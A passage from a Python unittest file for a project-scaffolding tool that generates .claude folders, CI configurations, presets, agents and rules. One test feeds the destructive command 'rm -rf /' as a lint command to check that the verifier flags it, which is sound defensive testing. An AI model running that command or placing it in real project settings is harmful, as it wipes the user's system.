        self.assertIn("my-app", guide)

    def test_guide_includes_frontend_steps(self):
        args = make_args(frontend="nextjs")
        guide = get_first_feature_guide(args)
        self.assertIn("generate-component", guide)

    def test_guide_skips_frontend_when_none(self):
        args = make_args(frontend="none")
        guide = get_first_feature_guide(args)
        self.assertNotIn("generate-component", guide)

    def test_guide_includes_backend_steps(self):
        args = make_args(frontend="none", backend="python-fastapi")
        guide = get_first_feature_guide(args)
        self.assertIn("generate-endpoint", guide)


class TestCiCdGeneration(unittest.TestCase):
    """Test CI/CD configuration generation."""

    def test_github_actions_node(self):
        args = make_args(test_cmd="npm run test", lint_cmd="npm run lint", build_cmd="npm run build")
        ci = get_github_actions_ci(args)
        self.assertIn("npm run test", ci)
        self.assertIn("npm run lint", ci)
        self.assertIn("setup-node", ci)

    def test_github_actions_python(self):
        args = make_args(backend="python-fastapi", test_cmd="pytest", lint_cmd="ruff check .")
        ci = get_github_actions_ci(args)
        self.assertIn("setup-python", ci)
        self.assertIn("pytest", ci)

    def test_github_actions_go(self):
        args = make_args(backend="go", test_cmd="go test ./...", lint_cmd="golangci-lint run")
        ci = get_github_actions_ci(args)
        self.assertIn("setup-go", ci)

    def test_gitlab_ci_structure(self):
        args = make_args(test_cmd="npm run test", lint_cmd="npm run lint")
        ci = get_gitlab_ci(args)
        self.assertIn("stages:", ci)
        self.assertIn("lint:", ci)
        self.assertIn("test:", ci)
        self.assertIn("build:", ci)

    def test_pr_template_has_checklist(self):
        template = get_pr_template()
        self.assertIn("## Summary", template)
        self.assertIn("[ ]", template)  # Has checkboxes

    def setUp(self):
        self.tmpdir = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_scaffold_creates_ci_files(self):
        args = make_args(output_dir=str(self.tmpdir), create_root=True, ci_cd="github-actions")
        scaffold(args)
        self.assertTrue((self.tmpdir / "test-app" / ".github" / "workflows" / "ci.yml").exists())
        self.assertTrue((self.tmpdir / "test-app" / ".github" / "pull_request_template.md").exists())

    def test_scaffold_creates_gitlab_ci(self):
        args = make_args(output_dir=str(self.tmpdir), create_root=True, ci_cd="gitlab-ci")
        scaffold(args)
        self.assertTrue((self.tmpdir / "test-app" / ".gitlab-ci.yml").exists())


class TestVerifyScaffold(unittest.TestCase):
    """Test post-scaffold verification."""

    def setUp(self):
        self.tmpdir = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_verify_clean_scaffold(self):
        args = make_args(output_dir=str(self.tmpdir), create_root=True)
        scaffold(args)
        project_dir = self.tmpdir / "test-app"
        issues = verify_scaffold(project_dir, args)
        self.assertEqual(len(issues), 0)

    def test_verify_detects_missing_dirs(self):
        project_dir = self.tmpdir / "test-app"
        project_dir.mkdir()
        (project_dir / ".claude").mkdir()
        args = make_args()
        issues = verify_scaffold(project_dir, args)
        self.assertTrue(any("Missing directory" in i for i in issues))

    def test_verify_detects_unsafe_command(self):
        args = make_args(output_dir=str(self.tmpdir), create_root=True, lint_cmd="rm -rf /")
        scaffold(args)
        project_dir = self.tmpdir / "test-app"
        issues = verify_scaffold(project_dir, args)
        self.assertTrue(any("lint_cmd" in i for i in issues))


class TestPresets(unittest.TestCase):
    """Test preset stack configurations."""

    def test_all_presets_have_required_keys(self):
        required = {"frontend", "backend", "database"}
        for name, preset in PRESETS.items():
            for key in required:
                self.assertIn(key, preset, f"Preset '{name}' missing '{key}'")

    def test_nextjs_fullstack_preset(self):
        preset = PRESETS["nextjs-fullstack"]
        self.assertEqual(preset["frontend"], "nextjs")
        self.assertEqual(preset["database"], "postgresql")
        self.assertEqual(preset["orm"], "prisma")

    def test_fastapi_preset(self):
        preset = PRESETS["fastapi"]
        self.assertEqual(preset["frontend"], "none")
        self.assertEqual(preset["backend"], "python-fastapi")
        self.assertEqual(preset["orm"], "sqlalchemy")

    def test_preset_count(self):
        self.assertGreaterEqual(len(PRESETS), 5, "Should have at least 5 presets")


class TestUpgrade(unittest.TestCase):
    """Test version upgrade logic."""

    def setUp(self):
        self.tmpdir = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_upgrade_updates_version(self):
        project_dir = self.tmpdir / "project"
        project_dir.mkdir()
        claude_dir = project_dir / ".claude"
        claude_dir.mkdir()
        config = {"project_name": "test", "version": "4.0.0"}
        (claude_dir / "launchpad-config.json").write_text(json.dumps(config))
        result = upgrade(project_dir)
        self.assertEqual(result, 0)
        updated = json.loads((claude_dir / "launchpad-config.json").read_text())
        self.assertEqual(updated["version"], VERSION)

    def test_upgrade_no_config_fails(self):
        project_dir = self.tmpdir / "empty"
        project_dir.mkdir()
        result = upgrade(project_dir)
        self.assertEqual(result, 1)

    def test_upgrade_already_current(self):
        project_dir = self.tmpdir / "project"
        project_dir.mkdir()
        claude_dir = project_dir / ".claude"
        claude_dir.mkdir()
        config = {"project_name": "test", "version": VERSION}
        (claude_dir / "launchpad-config.json").write_text(json.dumps(config))
        result = upgrade(project_dir)
        self.assertEqual(result, 0)

    def test_upgrade_creates_missing_dirs(self):
        project_dir = self.tmpdir / "project"
        project_dir.mkdir()
        claude_dir = project_dir / ".claude"
        claude_dir.mkdir()
        config = {"project_name": "test", "version": "4.0.0"}
        (claude_dir / "launchpad-config.json").write_text(json.dumps(config))
        upgrade(project_dir)
        self.assertTrue((claude_dir / "agents").exists())
        self.assertTrue((claude_dir / "rules").exists())


class TestScaffoldWithAgentsAndRules(unittest.TestCase):
    """Test end-to-end scaffold with agents and rules."""

    def setUp(self):
        self.tmpdir = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_agents_created(self):
        args = make_args(output_dir=str(self.tmpdir), create_root=True)
        scaffold(args)
        agents_dir = self.tmpdir / "test-app" / ".claude" / "agents"
        self.assertTrue(agents_dir.exists())
        self.assertTrue((agents_dir / "architect.md").exists())
        self.assertTrue((agents_dir / "testing.md").exists())
        self.assertTrue((agents_dir / "push.md").exists())

    def test_rules_created(self):
        args = make_args(output_dir=str(self.tmpdir), create_root=True, frontend="nextjs")
        scaffold(args)
        rules_dir = self.tmpdir / "test-app" / ".claude" / "rules"
        self.assertTrue(rules_dir.exists())
        self.assertTrue((rules_dir / "frontend.md").exists())

    def test_metadata_includes_new_fields(self):
        args = make_args(
            output_dir=str(self.tmpdir), create_root=True,
            orm="prisma", ci_cd="github-actions",
            dev_cmd="npm run dev", build_cmd="npm run build"
        )
        scaffold(args)
        config_path = self.tmpdir / "test-app" / ".claude" / "launchpad-config.json"
        data = json.loads(config_path.read_text())
        self.assertEqual(data["orm"], "prisma")
        self.assertEqual(data["ci_cd"], "github-actions")
        self.assertEqual(data["dev_cmd"], "npm run dev")
        self.assertEqual(data["version"], "5.0.0")


if __name__ == "__main__":
    unittest.main()
